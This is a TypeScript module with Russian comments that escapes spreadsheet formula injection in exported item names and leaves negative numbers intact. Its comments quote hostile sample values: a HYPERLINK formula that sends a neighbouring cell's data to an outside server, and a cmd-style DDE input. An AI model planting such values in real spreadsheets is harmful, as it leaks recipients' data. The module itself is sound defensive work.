/**
 * Экранирование формульных инъекций — роадмап M4, ТЗ §10.
 *
 * ОТКУДА БЕРЁТСЯ УГРОЗА
 *
 * В выгрузку попадают наименования позиций, взятые ИЗ ДОКУМЕНТОВ ЗАКАЗЧИКА И
 * ПОДРЯДЧИКОВ. Текст, начинающийся с `=`, `+`, `-` или `@`, Excel и LibreOffice
 * считают формулой и вычисляют при открытии файла. Наименование
 * `=HYPERLINK("http://…"&A1)` уводит содержимое соседней ячейки на чужой сервер
 * при простом открытии книги.
 *
 * Жертва при этом — НЕ МЫ. Книгу открывает заказчик, у которого рядом лежат его
 * собственные данные. Мы всего лишь передали ему текст, который сами не
 * проверили: наш файл, наша подпись, наша ответственность.
 *
 * ПОЧЕМУ ТЕКСТ НЕ РЕЖЕТСЯ
 *
 * Наименование позиции обязано дойти до человека БЕЗ ИЗМЕНЕНИЙ: по нему сверяют
 * смету с документом. «-40°C» и «40°C» — разные требования, и молчаливое
 * отбрасывание минуса испортит сверку тише, чем инъекция.
 *
 * Ведущий апостроф не меняет содержимого: табличный процессор трактует ячейку
 * как текст и показывает ровно то, что было в источнике, а сам апостроф в
 * ячейке не отображается.
 *
 * ЧИСЛА ЭКРАНИРОВАТЬ НЕЛЬЗЯ
 *
 * Отрицательное число начинается с минуса. Апостроф превратил бы его в текст, и
 * суммы по столбцу перестали бы считаться — то есть защита сломала бы выгрузку
 * ради угрозы, которой в числовой ячейке нет.
 */

/**
 * Символы, с которых табличный процессор начинает разбирать формулу.
 *
 * Ведущий «шум» — пробелы, табуляции и переводы строк — пропускается перед
 * поиском признака формулы, и это не педантизм. Сам Excel текст с ведущим
 * пробелом формулой не считает, но импортёры CSV и загрузчики 1С часто
 * ОБРЕЗАЮТ пробельные символы, и `" =1+1"`, безобидный в одном месте, снова
 * становится формулой в другом.
 *
 * При этом признак формулы ОБЯЗАТЕЛЕН: наименование позиции, начинающееся с
 * табуляции, но не с `=`, инъекцией не является, и вешать на него апостроф —
 * менять текст без причины.
 */
const DANGEROUS_START = /^[\s]*[=+\-@]/;

/** Уже обезвреженная строка: второй апостроф добавил бы видимый символ. */
const ALREADY_ESCAPED = /^'/;

/** Строгое десятичное число: только оно проходит как числовое значение. */
const NUMERIC = /^[+-]?\d+(?:[.,]\d+)?$/;

export interface EscapeOptions {
  /**
   * Значение записывается в числовую ячейку. Тогда экранирование применяется,
   * ТОЛЬКО если строка числом не является: `-1+cmd|…` числом не является и
   * обезвреживается, а `-1234.56` остаётся числом.
   */
  readonly numeric?: boolean;
}

export function escapeFormulaInjection(value: string, options: EscapeOptions = {}): string {
  if (value === "") return value;
  if (ALREADY_ESCAPED.test(value)) return value;

  if (options.numeric === true && NUMERIC.test(value)) return value;

  return DANGEROUS_START.test(value) ? `'${value}` : value;
}
